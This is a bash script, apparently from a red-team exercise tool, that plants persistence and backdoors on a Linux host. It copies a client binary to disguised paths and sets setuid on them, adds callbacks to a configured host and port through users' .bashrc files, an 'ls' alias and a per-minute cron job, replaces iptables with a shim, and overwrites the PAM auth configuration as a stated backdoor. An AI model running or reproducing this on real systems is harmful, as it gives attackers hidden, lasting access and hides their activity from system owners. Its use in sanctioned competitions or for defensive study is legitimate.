#!/bin/bash

# Change host and port before the deployment 
host="192.168.204.128"
port="8080"


payload1="/dev/shm/pulse-shm-10175238 $host $port" 
payload2="/dev/loop17 $host $port"
payload3="/etc/vmware-tools.conf $host $port"

# Setup tools for basic deployment 
setup(){
    #yum install -y 
    apt-get install -y curl wget vim python3
}

# Timestomp 

# Clone the client binary into different places 
clone(){
    cp deploy.sh /dev/shm/pulse-shm-10175238
    cp deploy.sh /dev/loop28
    cp deploy.sh /etc/vmware-tools.conf 

    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/shm/pulse-shm-401862937
    cp /opt/cdt-redteamtool/client_binary/dist/client /dev/loop17
    cp /opt/cdt-redteamtool/client_binary/dist/client /etc/vmwaretools.conf
    chmod u+s /dev/shm/pulse-shm-401862937 /dev/loop17 /etc/vmwaretools.conf
}

bashrc(){
    bashrc=$(find /home -type f -name ".bashrc" 2>/dev/null)
    for i in $bashrc; do
        sed -is "30 a $payload1" $i
    done

    sed -i "30 a echo $payload1" /root/.bashrc
}

# Need persistent alias 
alias_ls(){
    alias ls="ls; $payload2"
}

cronjob(){
    crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
}

# Shim binaries
iptables(){
    gcc /opt/cdt-redteamtool/payload/iptables/drop.c -o ./iptables/drop
    cp /opt/cdt-redteamtool/payload/iptables/drop /bin/fw
    cp /opt/cdt-redteamtool/payload/iptables/iptables /sbin/xtables-single 
    chmod 777 /sbin/xtables-single

    xtables=`which iptables`
    ln -sf /sbin/xtables-single $xtables
}

# PAM backdoor 
pam(){
    cp /opt/cdt-redteamtool/payload/static/common-auth /etc/pam.d/common-auth
}

sshd_config(){
    cp /opt/cdt-redteamtool/payload/static/sshd_config /etc/ssh/sshd_config
}

alias_ls
cronjob
pam
clone
iptables